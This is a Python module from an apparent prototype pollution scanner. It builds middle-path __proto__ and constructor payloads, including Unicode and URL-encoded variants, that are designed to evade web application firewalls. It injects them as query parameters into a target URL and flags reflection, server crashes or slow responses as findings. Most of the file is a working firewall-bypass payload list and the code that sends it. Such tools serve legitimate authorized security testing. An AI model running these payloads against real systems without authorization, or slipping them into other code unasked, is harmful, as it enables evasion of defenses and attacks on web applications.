"""
Probe WAF Bypass Scanner
========================
Middle-path prototype pollution WAF bypass module.

Targets CVE-2026-27837 and similar findings where WAF only inspects
the first segment of a property path. By placing __proto__ or constructor
at non-root positions (e.g., a.__proto__.b = x), the WAF filter is evaded.
"""

import logging
import time
from typing import List, Optional
from ppmap.models.findings import Finding, Severity, VulnerabilityType
from ppmap.scanner.base import BaseTierScanner, ScanContext
from ppmap.scanner.helpers import Colors

logger = logging.getLogger(__name__)

# --- Middle-path payload templates ---
# {k} is a neutral prefix property that bypasses shallow key inspection
MIDDLE_PATH_TEMPLATES = [
    # Standard __proto__ at mid-path
    "{k}[__proto__][polluted]=ppmap_mwb",
    "{k}[__proto__][toString]=ppmap_mwb",
    "{k}[__proto__][hasOwnProperty]=ppmap_mwb",
    "{k}[__proto__][valueOf]=ppmap_mwb",
    # Constructor mid-path
    "{k}[constructor][prototype][polluted]=ppmap_mwb",
    "{k}[constructor][prototype][toString]=ppmap_mwb",
    # Double-nested (bypass depth=1 inspections)
    "{k}[a][__proto__][polluted]=ppmap_mwb",
    "{k}[a][constructor][prototype][x]=ppmap_mwb",
    # Unicode lookalike bypass
    "{k}[\u005f\u005fproto\u005f\u005f][polluted]=ppmap_mwb",
    # URL-encoded variation (double-encoded handled by server)
    "{k}[%5F%5Fproto%5F%5F][polluted]=ppmap_mwb",
]

NEUTRAL_KEYS = ["data", "config", "opts", "settings", "req", "user", "item"]
MARKER = "ppmap_mwb"


class ProbeWAFBypassScanner(BaseTierScanner):
    """
    Detects prototype pollution through middle-path WAF bypass techniques.
    Bypasses WAFs that only inspect the top-level key in a property path.
    """

    @property
    def tier_name(self) -> str:
        return "Probe - Middle-Path WAF Bypass"

    def run(self, ctx: ScanContext) -> List[Finding]:
        self.log_start(ctx)
        findings = []
        url = ctx.target_url
        logger.info(f"[ProbeWAFBypass] Testing {url}")
        timeout = self.config.get("timeout", 15) if self.config else 15

        for neutral_key in NEUTRAL_KEYS:
            for template in MIDDLE_PATH_TEMPLATES:
                payload = template.format(k=neutral_key)
                finding = self._inject_and_verify(ctx, url, payload, timeout)
                if finding:
                    findings.append(finding)
                    return findings  # one confirmed is enough per URL

        if not findings:
            self.log_clean()
        return findings

    def _inject_and_verify(self, ctx: ScanContext, url: str, payload: str, timeout: int) -> Optional[Finding]:
        """Send the payload as a query parameter and check for reflection or crash."""
        import urllib.parse
        sep = "&" if "?" in url else "?"
        test_url = f"{url}{sep}{payload}"

        try:
            t0 = time.monotonic()
            resp = ctx.session.get(test_url, timeout=timeout, verify=False)
            elapsed = time.monotonic() - t0

            body = resp.text

            # 1. Direct reflection check
            if MARKER in body:
                logger.warning(f"[ProbeWAFBypass] Marker reflected! URL={test_url}")
                return Finding(
                    url=test_url,
                    payload=payload,
                    vulnerability_type=VulnerabilityType.PROTOTYPE_POLLUTION,
                    severity=Severity.HIGH,
                    evidence=f"Marker '{MARKER}' reflected in response body",
                    description=(
                        "Middle-path WAF bypass detected: WAF failed to block __proto__/"
                        "constructor placed at non-root segment of the property path. "
                        f"CVE reference: CVE-2026-27837 pattern. Payload: {payload}"
                    ),
                    tier=self.tier,
                )

            # 2. Server-error crash check  (500/502/503 indicate crash)
            if resp.status_code in (500, 502, 503):
                logger.warning(f"[ProbeWAFBypass] Server error {resp.status_code} for {test_url}")
                return Finding(
                    url=test_url,
                    payload=payload,
                    vulnerability_type=VulnerabilityType.PROTOTYPE_POLLUTION,
                    severity=Severity.MEDIUM,
                    evidence=f"HTTP {resp.status_code} triggered by mid-path pollution payload",
                    description=(
                        "Server returned an error code suggesting object prototype crash "
                        f"via middle-path WAF bypass payload. Payload: {payload}"
                    ),
                    tier=self.tier,
                )

            # 3. Timing anomaly (> 5s may indicate heavy gadget execution)
            if elapsed > 5.0:
                logger.warning(f"[ProbeWAFBypass] Timing anomaly {elapsed:.1f}s for {test_url}")
                return Finding(
                    url=test_url,
                    payload=payload,
                    vulnerability_type=VulnerabilityType.BLIND_PP,
                    severity=Severity.MEDIUM,
                    evidence=f"Response time {elapsed:.1f}s exceeds 5s threshold",
                    description=(
                        "Timing anomaly detected via middle-path WAF bypass payload, "
                        "suggesting prototype chain modification causing heavy computation."
                    ),
                    tier=self.tier,
                )

        except Exception as e:
            logger.debug(f"[ProbeWAFBypass] Error on {test_url}: {e}")

        return None
